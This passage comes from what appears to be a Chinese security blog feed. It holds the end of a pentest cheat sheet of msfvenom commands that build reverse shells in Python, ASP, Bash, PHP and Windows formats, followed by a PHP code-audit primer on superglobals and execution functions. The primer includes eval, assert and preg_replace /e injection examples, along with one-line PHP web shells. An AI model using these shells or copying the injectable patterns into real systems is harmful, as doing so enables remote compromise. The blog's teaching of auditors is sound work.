</code></pre><h2 id="MSF-生成反弹-Python-Shell"><a href="#MSF-生成反弹-Python-Shell" class="headerlink" title="MSF 生成反弹 Python Shell"></a>MSF 生成反弹 Python Shell</h2><pre><code class="bash">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
</code></pre><h2 id="MSF-生成反弹-ASP-Shell"><a href="#MSF-生成反弹-ASP-Shell" class="headerlink" title="MSF 生成反弹 ASP Shell"></a>MSF 生成反弹 ASP Shell</h2><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp
</code></pre><h2 id="MSF-生成反弹-Bash-Shell"><a href="#MSF-生成反弹-Bash-Shell" class="headerlink" title="MSF 生成反弹 Bash Shell"></a>MSF 生成反弹 Bash Shell</h2><pre><code class="bash">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh
</code></pre><h2 id="MSF-生成反弹-PHP-Shell"><a href="#MSF-生成反弹-PHP-Shell" class="headerlink" title="MSF 生成反弹 PHP Shell"></a>MSF 生成反弹 PHP Shell</h2><pre><code class="bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php
add &lt;?php at the beginning
perl -i~ -0777pe&#39;s/^/&lt;?php \n/&#39; shell.php
</code></pre><h2 id="MSF-生成反弹-Win-Shell"><a href="#MSF-生成反弹-Win-Shell" class="headerlink" title="MSF 生成反弹 Win Shell"></a>MSF 生成反弹 Win Shell</h2><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Co
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP 代码审计之 PHP 基础知识]]></title>
      <url>/2017/05/php-code-audit/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本文主要为学习代码审计前的一些 PHP 基础知识的学习笔记<a id="more"></a></p><h1 id="PHP-调试输出方法"><a href="#PHP-调试输出方法" class="headerlink" title="PHP 调试输出方法"></a>PHP 调试输出方法</h1><h2 id="PHP-常用的调试输出方法"><a href="#PHP-常用的调试输出方法" class="headerlink" title="PHP 常用的调试输出方法"></a>PHP 常用的调试输出方法</h2><ul><li><code>echo</code>：输出一个或多个字符串</li><li><code>print</code>:输出字符串输出字符串</li><li><code>print_r</code>：打印关于变量的易于理解的信息，常用来打印数组</li><li><code>var_dump</code>：打印变量的相关信息</li><li><code>var_export</code>：输出或返回一个变量的字符串表示</li></ul><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><blockquote><p>输出一个或多个字符串，语法说明：</p></blockquote><pre><code class="php">void echo ( string $arg1 [, string $... ] ) // 输出所有参数。
</code></pre><p><code>echo</code> 不是一个函数（它是一个语言结构）， 因此你不一定要使用小括号来指明参数，单引号，双引号都可以。 <code>echo</code> （不像其他语言构造）不表现得像一个函数， 所以不能总是使用一个函数的上下文。 另外，如果你想给 <code>echo</code> 传递多个参数， 那么就不能使用小括号。</p><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><blockquote><p>输出字符串，语法说明：</p></blockquote><pre><code class="php">int print ( string $arg ) // 输出 arg。
</code></pre><blockquote><p>print 实际上不是一个函数（它是一个语言结构），因此你可以不必使用圆括号来括起它的参数列表。</p></blockquote><h3 id="print-r"><a href="#print-r" class="headerlink" title="print_r"></a>print_r</h3><blockquote><p>打印关于变量的易于理解的信息，语法说明：</p></blockquote><pre><code class="php">bool print_r ( mixed $expression [, bool $return ] )
</code></pre><p><code>print_r()</code> 显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。</p><h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><blockquote><p>打印变量的相关信息，语法说明：</p></blockquote><pre><code class="php">void var_dump ( mixed $expression [, mixed $... ] )
</code></pre><p>此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><h3 id="var-export"><a href="#var-export" class="headerlink" title="var_export"></a>var_export</h3><blockquote><p>输出或返回一个变量的字符串表示，语法说明：</p></blockquote><pre><code class="php">mixed var_export ( mixed $expression [, bool $return ] )
</code></pre><blockquote><p>此函数返回关于传递给该函数的变量的结构信息，它和 <code>var_dump()</code> 类似，不同的是其返回的表示是合法的 PHP 代码。我们也可以通过将函数的第二个参数设置为 TRUE，从而返回变量的表示。</p></blockquote><p>另外还有一个函数 <code>debug_zval_dump</code> 可以进行输出，其结果与 vardump 类似，但比 vardump 多一个记录变量被引用次数的值refcount。这个函数很少使用。</p><blockquote><p>tips：PHP中单引号和双引号的区别。单引号内部的变量不会被执行，双引号内部的变量会被执行。</p></blockquote><h1 id="PHP-超全局变量数组"><a href="#PHP-超全局变量数组" class="headerlink" title="PHP 超全局变量数组"></a>PHP 超全局变量数组</h1><h2 id="PHP-全局变量数组"><a href="#PHP-全局变量数组" class="headerlink" title="PHP 全局变量数组"></a>PHP 全局变量数组</h2><ul><li><code>$_SERVER</code>：变量由 Web 服务器设定或直接与当前脚本的执行环境相关联</li><li><code>$_ENV</code>：执行环境提交至脚本的变量</li><li><code>$_GET</code>：经由 URL 请求提交至脚本的变量</li><li><code>$_POST</code>：经由 HTTP POST 方法提交至脚本的变量</li><li><code>$_REQUEST</code>：经由 GET，POST 和 COOKIT 机制提交至脚本的变量，因此该数组不值得信任</li><li><code>$_FILES</code>：经由 HTTP POST 方法上传而提交至脚本的变量</li><li><code>$_COOKIE</code>：经由 HTTP Cookies 方法提交至脚本的变量</li><li><code>$_SESSION</code>：当前注册给脚本会话的变量</li><li><code>$GLOBALS</code>：包含一个引用指向每个当前脚本的全局范围内有效的变量。改数组的键名为全局变量的名称</li></ul><h2 id="服务器变量：-SERVER"><a href="#服务器变量：-SERVER" class="headerlink" title="服务器变量：$_SERVER"></a>服务器变量：$_SERVER</h2><p><code>$_SERVER</code> 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些。</p><p>例如使用以下代码：</p><pre><code class="php">&lt;?PHP
  print_r($_SERVER);
?&gt;
</code></pre><p>输出为</p><pre><code class="php">Array (
  [HTTP_ACCEPT] =&gt; text/html, application/xhtml+xml
  [HTTP_ACCEPT_LANGUAGE] =&gt; zh-CN
  [HTTP_USER_AGENT] =&gt; Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
  [HTTP_ACCEPT_ENCODING] =&gt; gzip, deflate
  [HTTP_HOST] =&gt; localhost
  [HTTP_DNT] =&gt; 1
  [HTTP_CONNECTION] =&gt; Keep-Alive
  [PATH] =&gt; C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
  [SystemRoot] =&gt; C:\Windows
  [COMSPEC] =&gt; C:\Windows\system32\cmd.exe
  [PATHEXT] =&gt; .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  [WINDIR] =&gt; C:\Windows
  [SERVER_SIGNATURE] =&gt;
  [SERVER_SOFTWARE] =&gt; Apache/2.2.21 (Win32) PHP/5.3.10
  [SERVER_NAME] =&gt; localhost
  [SERVER_ADDR] =&gt; 127.0.0.1
  [SERVER_PORT] =&gt; 80
  [REMOTE_ADDR] =&gt; 127.0.0.1
  [DOCUMENT_ROOT] =&gt; D:/wamp/www/
  [SERVER_ADMIN] =&gt; admin@localhost
  [SCRIPT_FILENAME] =&gt; D:/wamp/www/1.php
  [REMOTE_PORT] =&gt; 50875
  [GATEWAY_INTERFACE] =&gt; CGI/1.1
  [SERVER_PROTOCOL] =&gt; HTTP/1.1
  [REQUEST_METHOD] =&gt; GET
  [QUERY_STRING] =&gt;
  [REQUEST_URI] =&gt; /1.php
  [SCRIPT_NAME] =&gt; /1.php
  [PHP_SELF] =&gt; /1.php
  [REQUEST_TIME] =&gt; 1451400854
)
</code></pre><p>下面列出了所有 <code>$_SERVER</code> 变量中的重要元素:</p><ul><li><code>$_SERVER[&#39;PHP_SELF&#39;]</code>: 当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/test.php/foo.bar" target="_blank" rel="external">http://example.com/test.php/foo.bar</a> 的脚本中使用 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 将得到 /test.php/foo.bar。FILE 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</li><li><code>$_SERVER[&#39;GATEWAY_INTERFACE&#39;]</code>: 服务器使用的 CGI 规范的版本；例如，”CGI/1.1”。</li><li><code>$_SERVER[&#39;SERVER_ADDR&#39;]</code>: 当前运行脚本所在的服务器的 IP 地址。|</li><li><code>$_SERVER[&#39;SERVER_NAME&#39;]</code>: 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。</li><li><code>$_SERVER[&#39;SERVER_SOFTWARE&#39;]</code>: 服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24)</li><li><code>$_SERVER[&#39;SERVER_PROTOCOL&#39;]</code>: 请求页面时通信协议的名称和版本。例如，”HTTP/1.0”。</li><li><code>$_SERVER[&#39;REQUEST_METHOD&#39;]</code>: 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</li><li><code>$_SERVER[&#39;REQUEST_TIME&#39;]</code>: 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)</li><li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>: query string（查询字符串），如果有的话，通过它进行页面访问。</li><li><code>$_SERVER[&#39;HTTP_ACCEPT&#39;]</code>: 当前请求头中 Accept: 项的内容，如果存在的话。</li><li><code>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]</code>: 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。</li><li><code>$_SERVER[&#39;HTTP_HOST&#39;]</code>: 当前请求头中 Host: 项的内容，如果存在的话。</li><li><code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>:引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</li><li><code>$_SERVER[&#39;HTTPS&#39;]</code>: 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>: 浏览当前页面的用户的 IP 地址。</li><li><code>$_SERVER[&#39;REMOTE_HOST&#39;]</code>: 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。</li><li><code>$_SERVER[&#39;REMOTE_PORT&#39;]</code>: 用户机器上连接到 Web 服务器所使用的端口号。</li><li><code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code>: 当前执行脚本的绝对路径。</li><li><code>$_SERVER[&#39;SERVER_ADMIN&#39;]</code>: 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。（如：admin@localhost）</li><li><code>$_SERVER[&#39;SERVER_PORT&#39;]</code>: Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。</li><li><code>$_SERVER[&#39;SERVER_SIGNATURE&#39;]</code>: 包含了服务器版本和虚拟主机名的字符串。</li><li><code>$_SERVER[&#39;PATH_TRANSLATED&#39;]</code>: 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。</li><li><code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>: 包含当前脚本的路径。这在页面需要指向自己时非常有用。<strong>FILE</strong> 常量包含当前脚本(例如包含文件)的完整路径和文件名。</li><li><code>$_SERVER[&#39;SCRIPT_URI&#39;]</code>: URI 用来指定要访问的页面。例如 “/index.html”。</li></ul><h2 id="环境变量：-ENV"><a href="#环境变量：-ENV" class="headerlink" title="环境变量：$_ENV"></a>环境变量：$_ENV</h2><p><code>$_ENV</code> 数组中的内容是在 PHP 解析器运行时，从 PHP 所在服务器中的环境变量转变为 PHP 全局变量的。它们中的许多都是由 PHP 所运行的系统决定的，完整的列表是不可能的，需要查看 PHP 所在的服务器的系统文档以确定其特定的环境变量。</p><p>我们可以使用以下代码输出 <code>$_ENV</code> 的全部信息：</p><pre><code class="php">&lt;?php
  print_r($_ENV);
?&gt;
</code></pre><p>输出为</p><pre><code class="php">Array (
  [ALLUSERSPROFILE] =&gt; C:\ProgramData
  [APPDATA] =&gt; C:\Windows\system32\config\systemprofile\AppData\Roaming
  [CommonProgramFiles] =&gt; C:\Program Files (x86)\Common Files
  [CommonProgramFiles(x86)] =&gt; C:\Program Files (x86)\Common Files
  [CommonProgramW6432] =&gt; C:\Program Files\Common Files
  [COMPUTERNAME] =&gt; WIN-46K74EGCQQV
  [ComSpec] =&gt; C:\Windows\system32\cmd.exe
  [FP_NO_HOST_CHECK] =&gt; NO
  [LOCALAPPDATA] =&gt; C:\Windows\system32\config\systemprofile\AppData\Local
  [NUMBER_OF_PROCESSORS] =&gt; 2
  [OS] =&gt; Windows_NT
  [Path] =&gt; C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Python27\
  [PATHEXT] =&gt; .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  [PROCESSOR_ARCHITECTURE] =&gt; x86
  [PROCESSOR_ARCHITEW6432] =&gt; AMD64
  [PROCESSOR_IDENTIFIER] =&gt; Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
  [PROCESSOR_LEVEL] =&gt; 6
  [PROCESSOR_REVISION] =&gt; 3f02
  [ProgramData] =&gt; C:\ProgramData
  [ProgramFiles] =&gt; C:\Program Files (x86)
  [ProgramFiles(x86)] =&gt; C:\Program Files (x86)
  [ProgramW6432] =&gt; C:\Program Files
  [PSModulePath] =&gt; C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
  [PUBLIC] =&gt; C:\Users\Public
  [SystemDrive] =&gt; C:
  [SystemRoot] =&gt; C:\Windows
  [TEMP] =&gt; C:\Windows\TEMP
  [TMP] =&gt; C:\Windows\TEMP
  [USERDOMAIN] =&gt; WORKGROUP
  [USERNAME] =&gt; WIN-46K74EGCQQV$
  [USERPROFILE] =&gt; C:\Windows\system32\config\systemprofile
  [windir] =&gt; C:\Windows
  [windows_tracing_flags] =&gt; 3
  [windows_tracing_logfile] =&gt; C:\BVTBin\Tests\installpackage\csilogfile.log
  [AP_PARENT_PID] =&gt; 2832
  )
</code></pre><p>注：如果 <code>$_ENV</code> 输出为空，是因为 php.ini 中的 variables_order 值为 “GPCS”，也就是说系统在定义 PHP 预定义变量时的顺序是 GET，POST，COOKIES 和 SERVER，没有定义 Environment(E)，只需要将 variables_order 值修改为 “EGPCS” 即可。</p><h2 id="URL-GET变量：-GET"><a href="#URL-GET变量：-GET" class="headerlink" title="URL GET变量：$_GET"></a>URL GET变量：$_GET</h2><p><code>$_GET</code> 数组是通过 URL GET 方法传递的变量组成的数组。它属于外部变量，即在服务器页面中通过 $_GET 数组获取 URL 方法传递过来的参数。例如服务器端有如下代码：</p><pre><code class="php">&lt;?php
  echo &#39;参数action的值为：&#39;.$_GET[&quot;action&quot;].&#39;&lt;br&gt;&#39;;
  echo &#39;参数username的值为：&#39;.$_GET[&quot;username&quot;].&#39;&lt;br&gt;&#39;;
  echo &#39;参数password的值为：&#39;.$_GET[&quot;password&quot;].&#39;&lt;br&gt;&#39;;
?&gt;
</code></pre><p>然后使用以下 URL 进行访问：</p><pre><code class="html">//localhost/1.php?action=login&amp;username=admin&amp;password=admin
</code></pre><p>输出即为：</p><blockquote><p>参数 action 的值为：login<br><br>参数 username 的值为：admin<br><br>参数 password 的值为：admin</p></blockquote><h2 id="HTTP-POST变量：-POST"><a href="#HTTP-POST变量：-POST" class="headerlink" title="HTTP POST变量：$_POST"></a>HTTP POST变量：$_POST</h2><p><code>$_POST</code> 数组类似于 <code>$_GET</code> 数组，不过是通过HTTP POST传递的变量组成的数组。$_GET 和 $_POST 都可以保存表单提交的变量，具体使用哪一种方法依据表单 form 标记中的 method 方法为 POST 或是 GET。例如以下代码构造一个登陆界面：</p><p>login.html</p><pre><code class="html">&lt;html&gt;
    &lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html; charset=utf-8&#39; /&gt;
    &lt;head&gt;
        &lt;title&gt;登陆&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
    &lt;form action=&quot;login_check.php&quot; method=&quot;post&quot;&gt;
        用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;
        密  码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
        &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt;
    &lt;/form&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>login_check.php</p><pre><code class="php">&lt;?php
  echo &#39;name:&#39;.$_POST[&quot;name&quot;].&#39;&lt;br&gt;&#39;;
  echo &#39;password:&#39;.$_POST[&quot;password&quot;].&#39;&lt;br&gt;&#39;;
?&gt;
</code></pre><p>这样在我们登陆过后就会显示我们 POST 提交的数据了：</p><blockquote><p>name:admin<br><br>password:admin</p></blockquote><h2 id="request变量：-REQUEST"><a href="#request变量：-REQUEST" class="headerlink" title="request变量：$_REQUEST"></a>request变量：$_REQUEST</h2><p><code>$_REQUEST</code> 数组包含 <code>$_GET</code>，<code>$_POST</code> 和 <code>$_COOKIE</code> 中的全部内容。假设表单内有一个输入域名为 name=”name”，如果通过 GET 方法提交，我们可以使用 $_GET[“name”] 进行访问；如果通过 POST 方法提交，我们可以使用 $_POST[“name”] 进行访问。但无论是通过 GET 或是 POST 提交的，我们都可以使用 $_REQUEST[“name”] 进行访问。</p><p>不过 <code>$_REQUEST</code> 速度较慢，而且较不安全，所以不推荐使用。</p><h2 id="HTTP文件上传变量：-FILES"><a href="#HTTP文件上传变量：-FILES" class="headerlink" title="HTTP文件上传变量：$_FILES"></a>HTTP文件上传变量：$_FILES</h2><p>使用表单的 file 输入域上传文件时，必须使用 POST 提交。但在服务器文件中，并不能通过 <code>$_POST</code> 获取到表单中的 file 域的内容。而 <code>$_FILES</code> 数据就是表单通过 POST 上传文件项目组成的数组。</p><p><code>$_FILES</code> 数组是一个二维数组，包含5个字数组元素：</p><ul><li><code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>：客户端机器文件的原名称，包含扩展名</li><li><code>$_FILES[&quot;file&quot;][&quot;size&quot;]</code>：已上传文件的大小，单位为字节</li><li><p><code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code>：伴随上传时产生的错误信息，有 5 个可能的值</p><ul><li><code>0</code>：表示没有发生任何错误，文件上传成功</li><li><code>1</code>：表示上传文件的大小超出了在 PHP 配置文件中指令 upload maxfilesize 选项限制的值</li><li><code>2</code>：表示上传文件的大小超出了 HTML 表单中 MAXFILESIZE 选项所指定的值</li><li><code>3</code>：表示文件只被部分上传</li><li><code>4</code>：表示没有上传任何文件</li></ul></li><li><p><code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code></p></li><li><p><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code></p></li></ul><p>下面简单构造一个文件上传的实例：</p><p>file.html</p><pre><code class="html">&lt;html&gt;
    &lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html; charset=utf-8&#39; /&gt;
    &lt;head&gt;
        &lt;title&gt;上传&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
            &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt;
            &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
            &lt;br&gt;
            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;
        &lt;/form&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>upload.php</p><pre><code class="php">&lt;?php
  echo &#39;$_FILES[&quot;file&quot;][&quot;name&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;name&quot;].&#39;&lt;br&gt;&#39;;
  echo &#39;$_FILES[&quot;file&quot;][&quot;size&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;size&quot;].&#39;&lt;br&gt;&#39;;
  echo &#39;$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&#39;&lt;br&gt;&#39;;
  echo &#39;$_FILES[&quot;file&quot;][&quot;error&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;error&quot;].&#39;&lt;br&gt;&#39;;
  echo &#39;$_FILES[&quot;file&quot;][&quot;type&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;type&quot;].&#39;&lt;br&gt;&#39;;
?&gt;
</code></pre><p>当不选择文件直接点击按钮时结果为：</p><blockquote><p>$_FILES[“file”][“name”] =<br><br>$_FILES[“file”][“size”] = 0<br><br>$_FILES[“file”][“tmp_name”] =<br><br>$_FILES[“file”][“error”] = 4<br><br>$_FILES[“file”][“type”] =</p></blockquote><p>当选择一个普通文件上传时结果为：</p><blockquote><p>$_FILES[“file”][“name”] = test.txt<br><br>$_FILES[“file”][“size”] = 383<br><br>$_FILES[“file”][“tmp_name”] = D:\wamp\tmp\phpFEE0.tmp<br><br>$_FILES[“file”][“error”] = 0<br><br>$_FILES[“file”][“type”] = text/plain</p></blockquote><h2 id="HTTP-Cookies：-COOKIE"><a href="#HTTP-Cookies：-COOKIE" class="headerlink" title="HTTP Cookies：$_COOKIE"></a>HTTP Cookies：$_COOKIE</h2><p><code>$_COOKIE</code> 数组是经由 HTTP Cookies 方法提交至脚本的变量。通常这些 Cookies 是由以前执行的 PHP 脚本通过 setCookie() 函数设置到客户端浏览器中的，当 PHP 脚本从客户浏览器提取了一个 cookie 后，它将自动的把它转换成一个变量，可以通过 <code>$_COOKIE</code> 数组和 cookie 名称来存取指定的 cookie 值。下面示例代码打印出当前会话的 Cookies：</p><pre><code class="php">&lt;?php
  //向客户端发送一个Cookie，将变量name值为admin，保存客户端一周的时间
  setcookie(&quot;name&quot;,&quot;admin&quot;,time()+60_60_24*7);
  print_r($_COOKIE);
?&gt;
</code></pre><p>刷新两次后看到结果为：</p><pre><code class="php">Array (
  [name] =&gt; admin
)
</code></pre><h2 id="Session-变量：-SESSION"><a href="#Session-变量：-SESSION" class="headerlink" title="Session 变量：$_SESSION"></a>Session 变量：$_SESSION</h2><p>会话控制是在服务器端使用 session 跟踪用户。当服务器页面中使用 session_start() 函数开启 session 后，就可以使用 <code>$_SESSION</code> 数组注册全局变量，用户可以在整个网站中访问这些会话信息。</p><h2 id="变量：-GLOBALS"><a href="#变量：-GLOBALS" class="headerlink" title="变量：$GLOBALS"></a>变量：$GLOBALS</h2><p><code>$GLOBALS</code> 是由所有已定义的全局变量组成的数组，变量名就是该数组的索引。在所有的脚本中都有效，在函数或对象的方法中不需要使用 global 关键字访问它。所以在函数中使用函数外部声明的全局变量时，可以使用 <code>$GLOBALS</code> 数组代替 global 关键字。下面是示例代码：</p><pre><code class="php">&lt;?php
  $x = 75;
  $y = 25;
  function addition() {
      echo $GLOBALS[&#39;z&#39;] = $GLOBALS[&#39;x&#39;] + $GLOBALS[&#39;y&#39;];
  }
  addition();
?&gt;
</code></pre><h1 id="PHP-执行系统外部命令"><a href="#PHP-执行系统外部命令" class="headerlink" title="PHP 执行系统外部命令"></a>PHP 执行系统外部命令</h1><p>PHP 用于执行系统外部命令的函数有：</p><ul><li><code>system()</code>：输出并返回最后一行 shell 结果</li><li><code>exec()</code>：不输出结果，返回最后一行 shell 结果，所有结果可以保存到一个返回的数组里面</li><li><code>passthru()</code>：只调用命令，把命令的运行结果原样地直接输出到标准输出设备上</li><li><code>shell_exec</code>：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</li><li><code>popen</code>：打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</li><li><code>proc_open</code>：类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力</li><li><code>pcntl_exec</code>：在当前进程空间执行指定程序</li><li><code>``(反引号)</code>：反引号中的内容作为外壳命令来执行，并将其输出信息返回。效果与 shell_exec() 函数相同。</li></ul><h1 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h1><p>常见的代码执行函数有3个：</p><ul><li><code>eval</code>：把字符串作为PHP代码执行</li><li><code>assert</code>：检查一个断言是否为 FALSE</li><li><code>preg_replace</code>：执行一个正则表达式的搜索和替换</li></ul><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><blockquote><p>把字符串作为 PHP 代码执行，说明：</p></blockquote><pre><code class="php">mixed eval ( string $code )
</code></pre><p>把字符串 code 作为 PHP 代码执行。另外 <code>eval()</code> 是一个语言构造器而不是一个函数，不能被可变函数调用。</p><p><code>eval()</code> 返回 <strong>NULL</strong>，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 如果在执行的代码中有一个解析错误，<code>eval()</code> 返回 <strong>FALSE</strong>，之后的代码将正常执行。</p><p>下面示例为简单的文本合并：</p><pre><code class="php">&lt;?php
  $string = &#39;cup&#39;;
  $name = &#39;coffee&#39;;
  $str = &#39;This is a $string with my $name in it.&#39;;
  echo $str. &quot;&lt;br&gt;&quot;;
  eval(&quot;\$str = \&quot;$str\&quot;;&quot;);//执行命令为$str=&quot;$str&quot;;
  echo $str. &quot;&lt;br&gt;&quot;;
?&gt;
</code></pre><p>输出为</p><pre><code class="php">This is a $string with my $name in it.
This is a cup with my coffee in it.
</code></pre><p>下面在举另一个常见的命令注入的例子：</p><pre><code class="php">&lt;?php
    if(isset($_GET[&#39;cmd&#39;])){
      $cmd = $_GET[&#39;cmd&#39;];
      eval(&quot;\$cmd=$cmd;&quot;);
  }
?&gt;
</code></pre><p>然后我们访问 URL <a href="http://localhost/test.php?cmd=phpinfo%28%29" target="_blank" rel="external">http://localhost/test.php?cmd=phpinfo%28%29</a> 就可以看到 phpinfo() 信息了。</p><p>另外最常见的PHP一句话木马就是 <code>eval()</code> 构成的：</p><pre><code class="php">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;
</code></pre><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><blockquote><p>检查一个断言是否为 FALSE。说明：</p></blockquote><pre><code class="php">bool assert ( mixed $assertion [, string $description ] )
</code></pre><p><strong>assert()</strong> 会检查指定的 assertion 并在结果为 <strong>FALSE</strong> 时采取适当的行动。</p><p>如果 assertion 是字符串，它将会被 <code>assert()</code> 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含_ assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 <code>assert_options()</code> 处理函数时，条件会转换为字符串，而布尔值 <strong>FALSE</strong> 会被转换成空字符串。</p><p><code>assert()</code> 的注入代码跟 <code>eval()</code> 类似，经常在 eval 关键字被屏蔽时使用 assert 代替，直接将上面示例中的 eval 改为 assert 即可：</p><pre><code class="php">&lt;?php
  if(isset($_GET[&#39;cmd&#39;])){
      $cmd = $_GET[&#39;cmd&#39;];
      assert(&quot;\$cmd=$cmd;&quot;);
  }
?&gt;
</code></pre><p>同样访问 URL <a href="http://localhost/test.php?cmd=phpinfo%28%29" target="_blank" rel="external">http://localhost/test.php?cmd=phpinfo%28%29</a> 就可以看到 phpinfo() 信息了。</p><p>另外使用 assert 的一句话木马为：</p><pre><code class="php">&lt;?php @assert($_POST[&#39;pass&#39;]);?&gt;
</code></pre><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><blockquote><p>执行一个正则表达式的搜索和替换，说明：</p></blockquote><pre><code class="php">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
</code></pre><p>搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。</p><p>函数将返回替换后的字符串，当 pattern 参数使用 /e 修正符时，<code>preg_replace</code> 函数会将 replacement 参数当作 PHP 代码执行，那么，针对此种情况，当 replacement 内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。为了测试 <code>preg_replace</code> 函数，我们构造PHP代码如下：</p><pre><code class="php">&lt;?php
  $string = &quot;hello world&quot;;
  $pattern = &quot;/^/e&quot;;
  echo preg_replace($pattern, $_GET[&quot;str&quot;], $string);
?&gt;
</code></pre><p>然后访问 <a href="http://localhost/test.php?str=phpinfo%28%29" target="_blank" rel="external">http://localhost/test.php?str=phpinfo%28%29</a> 就可以看到 phpinfo() 信息了。</p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> debug </category>
            
        </categories>
